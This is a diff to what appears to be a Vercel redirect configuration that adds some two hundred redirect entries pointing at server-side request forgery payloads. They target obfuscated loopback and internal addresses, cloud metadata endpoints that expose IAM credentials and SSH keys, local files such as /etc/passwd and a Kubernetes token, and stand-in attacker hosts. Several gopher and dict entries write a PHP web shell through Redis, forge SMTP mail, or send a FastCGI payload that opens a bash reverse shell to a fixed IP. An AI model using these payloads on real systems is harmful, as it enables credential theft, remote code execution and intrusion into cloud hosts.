@@ -2,7 +2,426 @@
     { "source": "/og6", "destination": "https://uniquename.vercel.app/" },
     { "source": "/og7", "destination": "file:///etc/passwd"},
     { "source": "/og8", "destination": "http://127.0.0.1"},
-    { "source": "/og9", "destination": "http://169.254.169.254/latest/user-data"},  
+    { "source": "/og9", "destination": "http://169.254.169.254/latest/user-data"},
+    { "source": "/og20", "destination": "https://ssecurityrise.com/127_22.php" },
+
+    { "source": "/og21", "destination": "https://ssecurityrise.com/127.php" },
+
+    { "source": "/og22", "destination": "http://ssecurityrise.com/127.php" },
+
+    { "source": "/og23", "destination": "http://ssecurityrise.com/127_1.php" },
+
+    { "source": "/og24", "destination": "https://ssecurityrise.com/127_2.php" },
+
+    { "source": "/og25", "destination": "https://ssecurityrise.com/127_3.php" },
+
+    { "source": "/og26", "destination": "https://ssecurityrise.com/127_4.php" },
+
+    { "source": "/og27", "destination": "https://ssecurityrise.com/127_5.php" },
+
+    { "source": "/og28", "destination": "https://ssecurityrise.com/127_6.php" },
+
+    { "source": "/og29", "destination": "https://ssecurityrise.com/192_168_0_1.php" },
+
+    { "source": "/og30", "destination": "https://ssecurityrise.com/192_168_1_1.php" },
+
+    { "source": "/og31", "destination": "https://ssecurityrise.com/etc_passwd.php" },
+
+    { "source": "/og32", "destination": "https://ssecurityrise.com/169254.php" },
+
+    { "source": "/og33", "destination": "https://ssecurityrise.com/169254_latest_user_data.php" },
+
+    { "source": "/og34", "destination": "https://ssecurityrise.com/100.100.100.200.php" },
+
+    { "source": "/og35", "destination": "https://ssecurityrise.com/192.0.0.192.php" },
+
+    { "source": "/og36", "destination": "https://ssecurityrise.com/173.194.44.70.php" },
+
+    { "source": "/og37", "destination": "http://google.com:80@127.0.0.1" },
+
+    { "source": "/og38", "destination": "http://evil.com#vulnsite.com" },
+
+    { "source": "/og39", "destination": "http://evil.com?vulnsite.com" },
+
+    { "source": "/og40", "destination": "http://evil.com%00vulnsite.com" },
+
+    { "source": "/og41", "destination": "http://evil.com💩vulnsite.com" },
+
+    { "source": "/og42", "destination": "http://%31%37%33%2E%31%39%34%2E%34%34%2E%37%30" },
+
+    { "source": "/og43", "destination": "http://0xad.0xc2.0x2c.0x46" },
+
+    { "source": "/og44", "destination": "http://0255.0302.0054.0106" },
+
+    { "source": "/og45", "destination": "http://173.0302.0x2c.70" },
+
+    { "source": "/og46", "destination": "http://0xad.0302.0x2c.0106" },
+
+    { "source": "/og47", "destination": "http://2915183686" },
+
+    { "source": "/og48", "destination": "http://025560426106" },
+
+    { "source": "/og49", "destination": "http://0xADC22C46" },
+
+    { "source": "/og50", "destination": "http://127.0.0.1:80" },
+
+    { "source": "/og51", "destination": "http://localhost:80" },
+
+    { "source": "/og52", "destination": "https://127.0.0.1:443" },
+
+    { "source": "/og53", "destination": "https://localhost:80" },
+
+    { "source": "/og54", "destination": "http://[::]:80" },
+
+    { "source": "/og55", "destination": "http://0000::1:80" },
+
+    { "source": "/og56", "destination": "http://[0:0:0:0:0:ffff:127.0.0.1]" },
+
+    { "source": "/og57", "destination": "http://0/" },
+
+    { "source": "/og58", "destination": "http://127.1" },
+
+    { "source": "/og59", "destination": "http://127.0.1" },
+
+    { "source": "/og60", "destination": "/etc/passwd" },
+
+    { "source": "/og61", "destination": "file:///etc/passwd" },
+
+    { "source": "/og62", "destination": "file://path/to/file" },
+
+    { "source": "/og63", "destination": "file://\/\/etc/passwd" },
+
+    { "source": "/og64", "destination": "file:///var/run/secrets/kubernetes.io/serviceaccount/token" },
+
+    { "source": "/og65", "destination": "sftp://attacker.com:8080/" },
+
+    { "source": "/og66", "destination": "dict://attacker:8080/" },
+
+    { "source": "/og67", "destination": "tftp://attacker.com:8080/" },
+
+    { "source": "/og68", "destination": "ldap://localhost:8080/" },
+
+    { "source": "/og69", "destination": "gopher://127.0.0.1:8080/" },
+
+    { "source": "/og70", "destination": "0" },
+
+    { "source": "/og71", "destination": "0.0" },
+
+    { "source": "/og72", "destination": "0.0.0" },
+
+    { "source": "/og73", "destination": "127.1" },
+
+    { "source": "/og74", "destination": "127.0.1" },
+
+    { "source": "/og75", "destination": "http://ⒼⓄⓄⒼⓁⒺ.ⓒⓞⓜ " },
+
+    { "source": "/og76", "destination": "http://127.0.0.1:21" },
+
+    { "source": "/og77", "destination": "http://127.0.0.1:22" },
+
+    { "source": "/og78", "destination": "http://127.0.0.1:25" },
+
+    { "source": "/og79", "destination": "http://127.0.0.1" },
+
+    { "source": "/og80", "destination": "http://127.0.0.1:465" },
+
+    { "source": "/og81", "destination": "http://127.0.0.1:3306" },
+
+    { "source": "/og82", "destination": "http://127.0.0.1:1234" },
+
+    { "source": "/og83", "destination": "http://127.0.0.8:8443" },
+
+    { "source": "/og84", "destination": "http://127.0.0.1:8080" },
+
+    { "source": "/og85", "destination": "http://localhost" },
+
+    { "source": "/og86", "destination": "http://localhost:8080" },
+
+    { "source": "/og87", "destination": "http://localhost:21" },
+
+    { "source": "/og88", "destination": "http://localhost:22" },
+
+    { "source": "/og89", "destination": "http://localhost:3306" },
+
+    { "source": "/og90", "destination": "http://localhost:443" },
+
+    { "source": "/og91", "destination": "http://127.0.0.1:443" },
+
+    { "source": "/og92", "destination": "http://0.0.0.0:80" },
+
+    { "source": "/og93", "destination": "http://0.0.0.0:443" },
+
+    { "source": "/og94", "destination": "http://0.0.0.0:22" },
+
+    { "source": "/og95", "destination": "https://127.0.0.1/" },
+
+    { "source": "/og96", "destination": "https://localhost/" },
+
+    { "source": "/og97", "destination": "http://[::]:80/" },
+
+    { "source": "/og98", "destination": "http://[::]:25/" },
+
+    { "source": "/og99", "destination": "http://[::]:22/" },
+
+    { "source": "/og100", "destination": "http://[::]:3128/" },
+
+    { "source": "/og101", "destination": "http://0000::1:80/" },
+
+    { "source": "/og102", "destination": "http://0000::1:25/" },
+
+    { "source": "/og103", "destination": "http://0000::1:22/" },
+
+    { "source": "/og104", "destination": "http://0000::1:3128/" },
+
+    { "source": "/og105", "destination": "http://localtest.me" },
+
+    { "source": "/og106", "destination": "http://n-pn.info" },
+
+    { "source": "/og107", "destination": "http://customer1.app.localhost.my.company.127.0.0.1.nip.io" },
+
+    { "source": "/og108", "destination": "http://127.127.127.127" },
+
+    { "source": "/og109", "destination": "http://127.0.1.3" },
+
+    { "source": "/og110", "destination": "http://127.0.0.0" },
+
+    { "source": "/og111", "destination": "http://0177.0.0.1/" },
+
+    { "source": "/og112", "destination": "http://2130706433/" },
+
+    { "source": "/og113", "destination": "http://3232235521/" },
+
+    { "source": "/og114", "destination": "http://3232235777/" },
+
+    { "source": "/og115", "destination": "localhost:+11211aaa" },
+
+    { "source": "/og116", "destination": "localhost:00011211aaaa" },
+
+    { "source": "/og117", "destination": "curl -v "http://evil$google.com"" },
+
+    { "source": "/og118", "destination": "http://1.1.1.1 &@2.2.2.2#@3.3.3.3/" },
+
+    { "source": "/og119", "destination": "2.2.2.2" },
+
+    { "source": "/og120", "destination": "3.3.3.3" },
+
+    { "source": "/og121", "destination": "http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ" },
+
+    { "source": "/og122", "destination": "dict://x.securityz.net/" },
+
+    { "source": "/og123", "destination": "ldap://localhost:11211/%0astats%0aquit" },
+
+    { "source": "/og124", "destination": "gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a" },
+
+    { "source": "/og125", "destination": "http://169.254.169.254" },
+
+    { "source": "/og126", "destination": "http://metadata.nicob.net/" },
+
+    { "source": "/og127", "destination": "http://169.254.169.254.nip.io/" },
+
+    { "source": "/og128", "destination": "http://1ynrnhl.nip.io/" },
+
+    { "source": "/og129", "destination": "http://www.owasp.org.1ynrnhl.nip.io/" },
+
+    { "source": "/og130", "destination": "http://nicob.net/redir6a" },
+
+    { "source": "/og131", "destination": "http://nicob.net/redir-http-169.254.169.254:80-" },
+
+    { "source": "/og132", "destination": "http://425.510.425.510/" },
+
+    { "source": "/og133", "destination": "http://2852039166/" },
+
+    { "source": "/og134", "destination": "http://7147006462/" },
+
+    { "source": "/og135", "destination": "http://0xA9.0xFE.0xA9.0xFE/" },
+
+    { "source": "/og136", "destination": "http://0xA9FEA9FE/" },
+
+    { "source": "/og137", "destination": "http://0x41414141A9FEA9FE/" },
+
+    { "source": "/og138", "destination": "http://0251.0376.0251.0376/" },
+
+    { "source": "/og139", "destination": "http://0251.00376.000251.0000376/" },
+
+    { "source": "/og140", "destination": "sftp://example.com:11111/" },
+
+    { "source": "/og141", "destination": "dict://example.com:11111/" },
+
+    { "source": "/og142", "destination": "tftp://evil.com:12346/TESTUDPPACKET" },
+
+    { "source": "/og143", "destination": "file:///C:/Windows/win.ini" },
+
+    { "source": "/og144", "destination": "http://[::1]:2375/containers/json" },
+
+    { "source": "/og145", "destination": "http://169.254.169.254/latest/user-data" },
+
+    { "source": "/og146", "destination": "http://169.254.169.254/latest/user-data/iam/security-credentials/admin" },
+
+    { "source": "/og147", "destination": "http://169.254.169.254/latest/meta-data/" },
+
+    { "source": "/og148", "destination": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin" },
+
+    { "source": "/og149", "destination": "http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance" },
+
+    { "source": "/og150", "destination": "http://169.254.169.254/latest/meta-data/ami-id" },
+
+    { "source": "/og151", "destination": "http://169.254.169.254/latest/meta-data/reservation-id" },
+
+    { "source": "/og152", "destination": "http://169.254.169.254/latest/meta-data/hostname" },
+
+    { "source": "/og153", "destination": "http://169.254.169.254/latest/meta-data/public-keys/" },
+
+    { "source": "/og154", "destination": "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key" },
+
+    { "source": "/og155", "destination": "http://169.254.169.254/latest/meta-data/public-keys/1/openssh-key" },
+
+    { "source": "/og156", "destination": "http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy" },
+
+    { "source": "/og157", "destination": "http://169.s254.169.254/computeMetadata/v1/" },
+
+    { "source": "/og158", "destination": "http://metadata.google.internal/computeMetadata/v1/" },
+
+    { "source": "/og159", "destination": "http://metadata/computeMetadata/v1/" },
+
+    { "source": "/og160", "destination": "http://metadata.google.internal/computeMetadata/v1/instance/hostname" },
+
+    { "source": "/og161", "destination": "http://metadata.google.internal/computeMetadata/v1/instance/1" },
+
+    { "source": "/og162", "destination": "http://metadata.google.internal/computeMetadata/v1/project/1" },
+
+    { "source": "/og163", "destination": "http://169.254.169.254/metadata/v1/maintenance" },
+
+    { "source": "/og164", "destination": "http://169.254.169.254/metadata/instance?api-version=2017-04-02" },
+
+    { "source": "/og165", "destination": "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text" },
+
+    { "source": "/og166", "destination": "http://169.254.169.254/openstack" },
+
+    { "source": "/og167", "destination": "http://169.254.169.254/2009-04-04/meta-data/" },
+
+    { "source": "/og168", "destination": "http://192.0.0.192/latest/" },
+
+    { "source": "/og169", "destination": "http://192.0.0.192/latest/user-data/" },
+
+    { "source": "/og170", "destination": "http://192.0.0.192/latest/meta-data/" },
+
+    { "source": "/og171", "destination": "http://192.0.0.192/latest/attributes/" },
+
+    { "source": "/og172", "destination": "http://100.100.100.200/latest/meta-data/" },
+
+    { "source": "/og173", "destination": "http://127.0.0.1:2379/v2/keys/?recursive=true" },
+
+    { "source": "/og174", "destination": "http://127.0.0.1:2375/v1.24/containers/json" },
+
+    { "source": "/og175", "destination": "http://1.1.1.1 &@2.2.2.2# @3.3.3.3/" },
+
+    { "source": "/og176", "destination": "0://evil.com:80;http://google.com:80/" },
+
+    { "source": "/og177", "destination": "http://127.1.1.1:80\@127.2.2.2:80/" },
+
+    { "source": "/og178", "destination": "http://127.1.1.1:80\@@127.2.2.2:80/" },
+
+    { "source": "/og179", "destination": "http://127.1.1.1:80:\@@127.2.2.2:80/" },
+
+    { "source": "/og180", "destination": "http://127.1.1.1:80#\@127.2.2.2:80/" },
+
+    { "source": "/og181", "destination": "http://mail.ebc.apple.com" },
+
+    { "source": "/og182", "destination": "http://bugbounty.dod.network" },
+
+    { "source": "/og183", "destination": "gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Creport@securityrise.com%3E%250d%250aRCPT%20TO%3A%3Cw2w@wearehackerone.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cw2w@wearehackerone.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a" },
+
+    { "source": "/og184", "destination": "http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]" },
+
+    { "source": "/og185", "destination": "http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]" },
+
+    { "source": "/og186", "destination": "http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key" },
+
+    { "source": "/og187", "destination": "http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access" },
+
+    { "source": "/og188", "destination": "http://169.254.169.254/latest/dynamic/instance-identity/document" },
+
+    { "source": "/og189", "destination": "http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role" },
+
+    { "source": "/og190", "destination": "http://metadata.google.internal/computeMetadata/v1/instance/id" },
+
+    { "source": "/og191", "destination": "http://metadata.google.internal/computeMetadata/v1/project/project-id" },
+
+    { "source": "/og192", "destination": "http://100.100.100.200/latest/meta-data/instance-id" },
+
+    { "source": "/og193", "destination": "http://100.100.100.200/latest/meta-data/image-id" },
+
+    { "source": "/og194", "destination": "http://127.0.0.1:2379/version" },
+
+    { "source": "/og195", "destination": "http://127.1:80" },
+
+    { "source": "/og196", "destination": "http://0" },
+
+    { "source": "/og197", "destination": "http://[0000::1]:80/" },
+
+    { "source": "/og198", "destination": "http://[0:0:0:0:0:ffff:127.0.0.1]/" },
+
+    { "source": "/og199", "destination": "1ynrnhl.nip.io" },
+
+    { "source": "/og200", "destination": "dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>" },
+
+    { "source": "/og201", "destination": "sftp://evil.com:11111/" },
+
+    { "source": "/og202", "destination": "gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A" },
+
+    { "source": "/og203", "destination": "gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body" },
+
+    { "source": "/og204", "destination": "gopher://127.0.0.1:4242/DATA" },
+
+    { "source": "/og205", "destination": "gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py" },
+
+    { "source": "/og206", "destination": "dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html" },
+
+    { "source": "/og207", "destination": "dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php" },
+
+    { "source": "/og208", "destination": "dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"" },
+
+    { "source": "/og209", "destination": "dict://127.0.0.1:6379/SAVE" },
+
+    { "source": "/og210", "destination": "gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml" },
+
+    { "source": "/og211", "destination": "gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php" },
+
+    { "source": "/og212", "destination": "gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22" },
+
+    { "source": "/og213", "destination": "gopher://127.0.0.1:6379/_save" },
+
+    { "source": "/og214", "destination": "http://localhost:9001/2021-04-01/runtime/invocation/next" },
+
+    { "source": "/og215", "destination": "http://169.254.169.254/computeMetadata/v1/" },
+
+    { "source": "/og216", "destination": "http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true" },
+
+    { "source": "/og217", "destination": "http://metadata.google.internal/computeMetadata/v1beta1/" },
+
+    { "source": "/og218", "destination": "http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true" },
+
+    { "source": "/og219", "destination": "gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a" },
+
+    { "source": "/og220", "destination": "http://169.254.169.254/metadata/v1.json" },
+
+    { "source": "/og221", "destination": "http://169.254.169.254/metadata/v1/ " },
+
+    { "source": "/og222", "destination": "http://169.254.169.254/metadata/v1/id" },
+
+    { "source": "/og223", "destination": "http://169.254.169.254/metadata/v1/user-data" },
+
+    { "source": "/og224", "destination": "http://169.254.169.254/metadata/v1/hostname" },
+
+    { "source": "/og225", "destination": "http://169.254.169.254/metadata/v1/region" },
+
+    { "source": "/og226", "destination": "http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address" },
+
+    { "source": "/og227", "destination": "http://169.254.169.254/2021-04-04/meta-data/ " },
+
+    { "source": "/og228", "destination": "http://rancher-metadata/1" },
+
+    { "source": "/og229", "destination": "gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00" },
     {
       "source": "/og2",
       "destination": "https://github.com/vercel/vercel"
